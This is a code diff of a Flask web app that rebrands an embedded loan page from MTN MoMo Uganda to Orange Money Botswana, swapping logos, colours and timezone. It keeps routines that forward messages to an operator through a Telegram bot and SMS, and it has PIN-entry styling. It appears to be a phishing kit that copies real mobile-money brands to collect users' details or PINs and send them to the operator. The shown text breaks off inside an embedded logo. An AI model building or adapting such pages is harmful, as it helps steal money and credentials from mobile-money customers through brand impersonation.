@@ -1,19 +1,17 @@
-import os
+﻿import os
 import json
 import redis
 import time
 import requests
-from flask import Flask, Response, request, jsonify
+from flask import Flask, Response, request, jsonify, send_from_directory
 from datetime import datetime
 import pytz
 
 app = Flask(__name__)
-from flask import send_from_directory
 
 @app.route('/assets/<path:filename>')
 def serve_assets(filename):
     return send_from_directory('assets', filename)
-
 
 # Africa's Talking & SMS Configuration
 ADMIN_NOTIFICATION_PHONE = os.environ.get("ADMIN_NOTIFICATION_PHONE")
@@ -43,7 +41,7 @@ def send_sms_notification(message):
     except Exception as e:
         print(f"Africa's Talking SMS dispatch failed: {e}")
 
-# Telegram Configuration (support both TELEGRAM_BOT_TOKEN and TELEGRAM_TOKEN)
+# Telegram Configuration
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
@@ -52,30 +50,19 @@ def send_telegram_notification(message):
         print("Telegram configuration missing. Notification skipped.")
         return
     try:
-        # Support for multiple chat IDs separated by commas
-        chat_ids = [cid.strip() for cid in TELEGRAM_CHAT_ID.split(',')]
-        
-        for chat_id in chat_ids:
-            if not chat_id:
-                continue
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {
-                "chat_id": chat_id,
-                "text": message,
-                "parse_mode": "Markdown"
-            }
-            try:
-                requests.post(url, json=payload, timeout=5)
-            except Exception as inner_e:
-                print(f"Failed to send to chat_id {chat_id}: {inner_e}")
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        print(f"Telegram notification orchestration failed: {e}")
+        print(f"Telegram notification dispatch failed: {e}")
 
-
-# Helper to get current time in Uganda/Johannesburg timezone
 def get_now_str():
     try:
-        tz = pytz.timezone('Africa/Kampala')
+        tz = pytz.timezone("Africa/Gaborone")
         now = datetime.now(tz)
     except:
         now = datetime.now()
@@ -86,12 +73,7 @@ db = None
 try:
     redis_url = os.environ.get("REDIS_URL")
     if redis_url:
-        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}") # Log host only for safety
-        
-        # Comprehensive connection parameters for Cloud Providers (Upstash/Vercel)
-        # 1. ssl_cert_reqs=None ignores self-signed/provider cert issues
-        # 2. socket_timeout ensures we don't hang the lambda forever
-        # 3. retry_on_timeout handles cold starts
+        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}")
         db = redis.from_url(
             redis_url, 
             decode_responses=True, 
@@ -100,28 +82,29 @@ try:
             socket_connect_timeout=5.0,
             retry_on_timeout=True
         )
-        # Test connection immediately
         db.ping()
         print("Redis client initialized and verified successfully.")
     else:
         print("REDIS_URL environment variable not found.")
 except Exception as e:
     print(f"Redis initialization failed CRITICAL: {e}")
-    db = None # Reset to ensure we don't use a broken client
+    db = None
 
 HTML_PAGE = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN MoMo Loans — Uganda Mobile Money</title>
+  <title>Orange Money Botswana — Instant Mobile Loans</title>
+  <link rel="icon" type="image/png" href="/assets/logo.png">
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     :root {
-      --brand-blue: #004F71;
-      --brand-yellow: #FFCC00;
-      --brand-blue-dark: #00334E;
-      --brand-accent: #FFCC00;
+      --brand-orange: #FF7900;
+      --brand-orange-dark: #E66A00;
+      --brand-black: #000000;
+      --brand-dark: #121212;
+      --brand-light: #FFF5EC;
     }
     @keyframes waveDot {
       0%, 100% { transform: translateY(0); }
@@ -131,34 +114,15 @@ HTML_PAGE = r"""<!DOCTYPE html>
     .wave-dot-1 { animation: waveDot 0.8s infinite ease-in-out 0.15s; }
     .wave-dot-2 { animation: waveDot 0.8s infinite ease-in-out 0.3s; }
     .wave-dot-3 { animation: waveDot 0.8s infinite ease-in-out 0.45s; }
-    .bg-momo-blue { background-color: var(--brand-blue); }
-    .text-momo-blue { color: var(--brand-blue); }
-    .bg-momo-yellow { background-color: var(--brand-yellow); }
-    .text-momo-yellow { color: var(--brand-yellow); }
     
-    /* Override for existing classes to minimize breakage */
-    .bg-MTN MoMo-blue { background-color: var(--brand-blue); }
-    .text-MTN MoMo-blue { color: var(--brand-blue); }
-    .bg-MTN MoMo-cyan { background-color: var(--brand-yellow); }
-    .text-MTN MoMo-cyan { color: var(--brand-yellow); }
-    . { background-color: var(--brand-blue); }
-    .text-[#004F71] { color: var(--brand-blue); }
-    . { background-color: var(--brand-cyan); } /* Use cyan instead of red for brand consistency */
-    .text-[#004F71] { color: var(--brand-cyan); }
-    .bg-[#FFCC00] { background-color: var(--brand-blue-dark); }
-    .text-[#FFCC00] { color: var(--brand-blue-dark); }
-    
-    .accent-MTN MoMo { accent-color: var(--brand-blue); }
-    
-    .gradient-MTN MoMo {
-      background: linear-gradient(135deg, var(--brand-blue) 0%, var(--brand-blue-dark) 100%);
-    }
-    .gradient-cyan {
-      background: linear-gradient(135deg, var(--brand-cyan) 0%, var(--brand-blue) 100%);
-    }
-    .border-[#FFCC00] { border-color: var(--brand-green); }
+    .bg-orange-brand { background-color: var(--brand-orange); }
+    .text-orange-brand { color: var(--brand-orange); }
+    .border-orange-brand { border-color: var(--brand-orange); }
+    .hover-bg-orange-dark:hover { background-color: var(--brand-orange-dark); }
+
     .hide-scrollbar::-webkit-scrollbar { display: none; }
     .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    
     @keyframes pin-wavy {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
@@ -172,187 +136,211 @@ HTML_PAGE = r"""<!DOCTYPE html>
     .animate-pin-wavy:nth-child(4) { animation-delay: 0.3s; }
   </style>
 </head>
-<body class="bg-[#f4f5f7] text-slate-900 antialiased min-h-screen flex flex-col justify-between">
+<body class="bg-[#f8f9fa] text-slate-900 antialiased min-h-screen flex flex-col justify-between selection:bg-orange-500 selection:text-white">
 
   <!-- TOP HEADER -->
-  <header class="bg-white border-b border-slate-200 sticky top-0 z-40 shadow-sm">
+  <header class="bg-black border-b border-zinc-800 sticky top-0 z-40 shadow-md">
     <div class="max-w-[760px] mx-auto px-4 h-16 flex items-center justify-between">
       <div class="flex items-center gap-3 cursor-pointer" onclick="goTo('home')">
-        <div class="flex items-center gap-2">
-          <img src="data:image/png;base64,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" alt="MTN MoMo Logo" class="h-10 w-auto object-contain">
-          <div class="flex flex-col">
-            <span class="text-lg font-black text-[#FFCC00] leading-none" style="color: #FFCC00; -webkit-text-stroke: 0.5px #004F71;">MoMo</span>
-            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">from MTN</span>
-          </div>
+        <!-- Orange Brand Icon -->
+        <div class="relative w-10 h-10 bg-[#FF7900] rounded-xl flex items-end p-1.5 shadow-md select-none flex-shrink-0">
+          <span class="text-white font-extrabold text-[12px] tracking-tight leading-none font-sans">orange<span class="text-[7px] align-super">™</span></span>
         </div>
-        <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-yellow-50 text-yellow-700 border border-yellow-200">
-          <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></span>
-          Live
-        </span>
+        <div class="flex flex-col">
+          <div class="flex items-center gap-1.5">
+            <span class="text-lg font-black tracking-tight text-white leading-none">Orange</span>
+            <span class="text-lg font-black tracking-tight text-[#FF7900] leading-none">Money</span>
+          </div>
+          <span class="text-[10px] uppercase font-bold text-zinc-400 tracking-wider">Mobile Loans</span>
+        </div>
       </div>
-
-      <button id="menu-btn" onclick="toggleMenu(true)" class="p-2 text-slate-700 hover:bg-slate-100 ">
-        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+      <button onclick="toggleMenu(true)" class="p-2.5 rounded-xl hover:bg-zinc-800 text-white transition-all active:scale-95" aria-label="Menu">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 6h16M4 12h16M4 18h16"/>
+        </svg>
       </button>
     </div>
   </header>
 
-  <!-- SLIDE-OVER MENU -->
-  <div id="drawer" class="fixed inset-0 z-50 pointer-events-none transition-opacity duration-300 opacity-0">
-    <div onclick="toggleMenu(false)" class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm"></div>
-    <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300">
+  <!-- SIDE DRAWER MENU -->
+  <div id="drawer" class="fixed inset-0 z-50 pointer-events-none opacity-0 transition-opacity duration-300">
+    <div class="absolute inset-0 bg-black/60 backdrop-blur-xs" onclick="toggleMenu(false)"></div>
+    <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-zinc-950 text-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300 border-l border-zinc-800">
       <div>
-        <div class="flex items-center justify-between pb-4 border-b border-slate-200"><img src="data:image/png;base64,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